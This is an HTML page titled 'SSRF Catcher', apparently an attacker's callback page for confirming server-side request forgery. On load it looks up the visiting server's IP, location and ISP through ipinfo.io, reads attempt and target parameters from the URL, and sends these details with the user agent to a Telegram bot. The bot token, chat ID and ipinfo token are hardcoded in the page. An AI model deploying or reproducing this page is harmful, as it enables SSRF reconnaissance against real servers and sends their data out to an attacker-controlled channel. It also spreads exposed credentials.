<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SSRF Catcher</title>
  <script>
    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        return await res.json();
      } catch (e) {
        return {};
      }
    }

    async function sendToTelegram(message) {
      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
      const chat_id = "6239813037";
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
      });
    }

    function getAttemptDetails() {
      const params = new URLSearchParams(window.location.search);
      return {
        attempt: params.get("attempt") || "Unknown",
        target: decodeURIComponent(params.get("target") || "Unknown")
      };
    }

    function formatMessage(data, attemptInfo) {
      return `📄 *[SSRF CATCHER]*
🌟 *SSRF Confirmed!* Server followed localhost redirect.

🎯 *Attempt #:* ${attemptInfo.attempt}
🔗 *Target:* ${attemptInfo.target}

🌐 *IP:* ${data.ip || "Unknown"}
📍 *City:* ${data.city || "Unknown"}
🌎 *Country:* ${data.country || "Unknown"}
🏢 *ISP:* ${data.org || "Unknown"}
🧠 *User-Agent:* \`${navigator.userAgent}\`
🕒 *Timestamp:* ${new Date().toISOString()}`;
    }

    async function run() {
      const ipData = await getIPInfo();
      const attemptInfo = getAttemptDetails();
      const msg = formatMessage(ipData, attemptInfo);
      await sendToTelegram(msg);
    }

    window.onload = run;
  </script>
</head>
<body>
  <h1>📡 Catcher Stage Triggered</h1>
</body>
</html>
